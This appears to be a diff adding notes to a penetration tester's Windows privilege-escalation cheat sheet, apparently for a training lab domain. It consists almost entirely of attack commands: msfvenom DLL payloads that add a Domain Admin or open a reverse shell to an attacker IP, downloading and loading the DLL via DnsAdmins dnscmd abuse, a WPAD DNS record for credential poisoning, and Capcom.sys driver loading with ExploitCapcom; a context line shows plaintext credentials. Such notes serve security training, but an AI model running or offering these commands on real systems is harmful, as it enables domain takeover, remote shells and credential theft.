@@ -246,5 +246,104 @@ wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | fin
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
 The cmdlet can also be run as another user with the -Credential parameter.
+# DNS Admins
+## Leveraging DnsAdmins Access
+```
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+```
+```
+sudo python3 -m http.server 7777
+```
+From clients powershell
+```
+wget "http://10.10.14.214:7777/adduser.dll" -outfile "adduser.dll"
+```
+From clients CMD
+```
+dnscmd.exe /config /serverlevelplugindll C:\tools\adduser.dll
+```
+if denied execute this in powershell
+```
+Get-ADGroupMember -Identity DnsAdmins
+```
+### Finding Users SID
+```
+wmic useraccount where name="netadm" get sid
+```
+### Checking Permissions on DNS Service
+```
+sc.exe sdshow DNS
+```
+### Stop and Start DNS Services
+```
+sc stop dns
+sc start dns
+```
 
+### Confirming Group Membership
+```
+net group "Domain Admins" /dom
+```
+https://medium.com/@parvezahmad90/windows-privilege-escalation-dns-admin-to-nt-authority-system-step-by-step-945fe2a094dc
+
+For a reverseshell use this payload
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.214 LPORT=4444 --platform windows -f dll > netsec.dll
+```
+## Mimilib
+http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
+
+## Creating a WPAD Record
+```
+Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+```
+```
+Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+```
+Then use inveigh or responder
+
+# Print Operators
+Run CMD as Admin
+### Required tools
+```
+EnableSeLoadDriverPrivilege.cpp
+Capcom.sys driver 
+```
+## Add Reference to Drive
+```
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+```
+```
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+```
+## Verify the driver is not loaded
+```
+.\DriverView.exe /stext drivers.txt
+```
+```
+cat drivers.txt | Select-String -pattern Capcom
+```
+## Verify Privledge is enabled
+```
+EnableSeLoadDriverPrivilege.exe
+```
+## Verify the driver
+```
+.\DriverView.exe /stext drivers.txt
+```
+```
+cat drivers.txt | Select-String -pattern Capcom
+```
+## Used ExploitCapcom Tool to escalate privileges
+```
+.\ExploitCapcom.exe
+```
+## Automating the Steps with EoPLoadDriver.exe
+```
+EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+```
+## Used ExploitCapcom Tool to escalate privileges
+```
+.\ExploitCapcom.exe
+```
 
